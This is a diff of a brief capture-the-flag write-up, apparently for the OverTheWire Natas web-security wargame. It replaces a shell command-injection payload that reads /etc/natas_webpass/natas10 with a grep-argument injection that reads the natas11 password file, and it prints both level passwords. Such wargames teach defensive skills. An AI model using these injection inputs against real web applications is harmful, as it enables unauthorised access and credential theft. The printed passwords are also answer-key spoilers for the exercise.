@@ -1,6 +1,7 @@
-If you check the code you can see that there're bash code being executed without sanitization. Just execute a command to get the password.
+If we can't execute commands besides grep, then let's just use grep.
+We can search through the password file itself.
 
-; sh -c "cat /etc/natas_webpass/natas10"
+a /etc/natas_webpass/natas11
 
-t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
 
